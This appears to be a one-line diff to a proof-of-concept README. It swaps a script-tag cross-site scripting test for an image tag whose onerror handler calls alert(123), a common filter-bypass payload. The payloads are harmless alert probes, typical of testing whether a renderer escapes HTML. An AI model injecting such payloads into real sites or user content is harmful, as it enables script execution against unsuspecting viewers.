@@ -1,3 +1,3 @@
 # poc
 
-<script>alert(123)</script>
+<img src=/fizzbuzz onerror=alert(123) />
